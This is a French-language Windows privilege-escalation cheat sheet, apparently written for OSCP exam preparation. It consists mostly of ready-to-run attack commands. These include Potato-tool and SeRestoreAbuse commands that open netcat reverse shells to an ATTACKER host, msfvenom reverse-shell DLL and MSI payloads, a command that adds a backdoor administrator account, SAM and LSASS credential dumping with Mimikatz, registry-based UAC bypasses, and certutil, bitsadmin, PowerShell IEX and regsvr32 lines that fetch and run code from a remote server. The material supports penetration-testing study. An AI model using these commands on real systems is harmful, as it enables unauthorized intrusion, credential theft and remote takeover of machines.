# 🟡 Privilege Escalation — Windows

## Enumeration automatique

```powershell
# winPEAS (le plus complet)
.\winPEASx64.exe

# PowerUp (AppLocker aware, moins bruyant)
. .\PowerUp.ps1; Invoke-AllChecks

# Seatbelt (C#, beaucoup d'info)
.\Seatbelt.exe -group=all

# Sherlock (kernel exploits)
. .\Sherlock.ps1; Find-AllVulns

# JAWS (PowerShell standalone)
.\jaws-enum.ps1
```

## Checks manuels

```cmd
:: Identité
whoami
whoami /priv
whoami /groups
whoami /all

:: Utilisateurs / groupes
net user
net localgroup administrators
net session

:: Système
systeminfo
hostname
wmic qfe list brief         :: patches installés

:: Réseau
ipconfig /all
route print
arp -a
netstat -ano | findstr LISTEN

:: Process
tasklist /v
tasklist /svc

:: Services
sc qc <servicename>
wmic service get name,displayname,pathname,startmode,startname | findstr /I "auto"

:: Scheduled tasks
schtasks /query /fo LIST /v
```

## Token privileges — LE réflexe

`whoami /priv` → cherche ces privs :

| Privilege | Exploit |
|---|---|
| **SeImpersonatePrivilege** | Potatoes (Juicy/God/PrintSpoofer/Sigma) |
| **SeAssignPrimaryToken** | Potatoes |
| **SeDebugPrivilege** | dumper lsass, injection |
| **SeBackupPrivilege** | read SYSTEM/SAM |
| **SeRestorePrivilege** | SeRestoreAbuse |
| **SeTakeOwnership** | prendre possession de fichiers protégés |
| **SeLoadDriver** | load driver malveillant |
| **SeTcb** | jackpot (rare) |

### Potato family

```powershell
# JuicyPotato (≤ Win 10 1803 / Server 2016)
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user pwned P@ssw0rd /add && net localgroup administrators pwned /add" -t *

# PrintSpoofer (Win10 1809+ / Server 2019)
.\PrintSpoofer64.exe -i -c "cmd /c whoami"
.\PrintSpoofer64.exe -c "nc.exe ATTACKER 4444 -e cmd.exe"

# GodPotato (Win10/Server 2019/2022 récents)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "nc.exe ATTACKER 4444 -e cmd.exe"

# SigmaPotato (remplaçant universel)
.\SigmaPotato.exe "nc.exe ATTACKER 4444 -e cmd.exe"

# SeRestoreAbuse
.\SeRestoreAbuse.exe "nc.exe ATTACKER 4444 -e cmd.exe"
```

### SeBackupPrivilege → dump SAM/SYSTEM

```cmd
:: Copier les hives
reg save hklm\sam C:\temp\sam.save
reg save hklm\system C:\temp\system.save
reg save hklm\security C:\temp\security.save

:: Côté attaquant
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

## Services mal configurés

```powershell
# Service avec un path non-quoté + répertoire writable
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"

# Unquoted service path
:: C:\Program Files\Sub Dir\service.exe
:: → Windows essaie C:\Program.exe puis C:\Program Files\Sub.exe
icacls "C:\Program Files\Sub Dir\"        :: writable par "Users" ?
```

### Modifier la config d'un service

```cmd
:: Vérifier les droits
sc qc VulnService
sc sdshow VulnService
accesschk.exe /accepteula -uwcv user "VulnService"

:: Changer le binpath
sc config VulnService binpath= "C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

### DLL hijacking

```powershell
# Process Monitor pour voir les DLLs cherchées et non trouvées
# Remplacer une DLL manquante par notre payload (renommée)
msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=4444 -f dll > hijack.dll
```

## AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: Si les deux = 1 : MSI packager donne SYSTEM
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=4444 -f msi > payload.msi
msiexec /quiet /qn /i payload.msi
```

## Credentials en plain-text

```cmd
:: Unattend / Sysprep
findstr /si password C:\Windows\Panther\Unattend*.xml
findstr /si password C:\Windows\Panther\Unattended*.xml
findstr /si password C:\Windows\System32\Sysprep\*.xml
findstr /si password C:\inetpub\wwwroot\web.config

:: Registre
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s     :: PuTTY
reg query "HKCU\Software\ORL\WinVNC3\Password"              :: VNC
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"     :: SNMP community

:: Profil roaming
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

:: Fichiers fréquents
dir /s *pass* == *cred* == *vnc* == *.config
findstr /spin "password" *.txt *.xml *.ini *.config *.properties
```

## LSASS + Mimikatz

```powershell
# Dump lsass (SeDebug ou admin local)
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# Chercher dans le dump côté attaquant :
pypykatz lsa minidump lsass.dmp

# Mimikatz in-memory
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
lsadump::sam
lsadump::secrets
```

## UAC bypass (si local admin mais Medium Mandatory Level)

```powershell
# fodhelper (Win10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe"

# eventvwr (Win7-10)
reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d "C:\temp\shell.exe"
eventvwr.exe
```

## Kernel exploits (dernier recours)

```powershell
# Chercher selon systeminfo / wmic qfe
wmic qfe get HotFixID
# Puis Windows-Exploit-Suggester.py ou WES-NG

# Classiques OSCP-era :
MS16-032   # PS (<Win10 1607)
MS16-075   # Hot Potato ancien
PrintNightmare (CVE-2021-34527)    # spooler
CVE-2020-0787   # BITS / Arbitrary File Move
```

> ⚠ Sur l'examen OSCP : `whoami /priv` doit être ton réflexe. Si tu
> vois `SeImpersonate` ou `SeAssignPrimaryToken` → 90 % des cas c'est
> un Potato qui te donne SYSTEM. Les services mal configurés arrivent
> ensuite, puis les creds stockés.

## LOLBAS

https://lolbas-project.github.io/ — toujours chercher le binaire
Windows qu'on veut utiliser.

Grands classiques :

```cmd
certutil -urlcache -split -f http://ATTACKER/file.exe out.exe
certutil -decode in.b64 out.exe

bitsadmin /transfer job http://ATTACKER/file.exe C:\temp\file.exe

powershell -c "IWR http://ATTACKER/file.exe -OutFile C:\temp\f.exe"
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/p.ps1')"

# Execute via regsvr32 (signed binary)
regsvr32 /s /n /u /i:http://ATTACKER/file.sct scrobj.dll
```
